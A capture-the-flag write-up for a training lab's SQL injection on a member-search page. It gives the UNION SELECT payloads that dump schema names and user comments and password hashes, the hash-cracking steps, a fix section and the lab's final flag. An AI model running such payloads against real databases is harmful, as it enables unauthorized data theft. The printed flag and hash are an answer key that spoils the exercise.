@@ -1,0 +1,45 @@
+********** Sql_injection **********
+
+URL :
+- http://192.168.86.128/?page=member
+
+Preview :
+This page ask the user to use an id to search a user on the database. We can see an sql injection attack if we try to fill something like "\`" because the server pop an sql error: `Unknown column '' in 'where clause'`
+
+Steps :
+Firstly, we need to dump all the columns and the tables name to see what we can do to find the flag.
+
+--> 1 UNION SELECT column_name, table_name from information_schema.columns#
+
+We obtain all the tables and all the columns of each tables.
+
+The users table have some interesting columns:
+- user_id
+- first_name
+- last_name
+- town
+- country
+- planet
+- Commentaire
+- countersign
+
+Dump the columns *Commentaire* and *countersign* :
+
+--> 1 UNION SELECT commentaire, countersign from users#
+
+Result:
+
+ID: 1 UNION SELECT commentaire, countersign from users# 
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+- step 1 -> go to http://md5decrypt.net/#answer and decrypt `5ff9d0165b4f92b14994e5c685cdce28`
+- step 2 -> lower the upper case of our decrypt mdp: FortyTwo
+- step 3 -> sha256 him with http://md5decrypt.net/Sha256/
+
+Fix :
+- locked the variable recovered with the \_GET method betwen 2 quote.
+- use a function to escape special character like quote, NULL, \\n, \\r etc...
+- use the functions like `isnumeric()` to be sure we have recovered a numerical value.
+
+Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
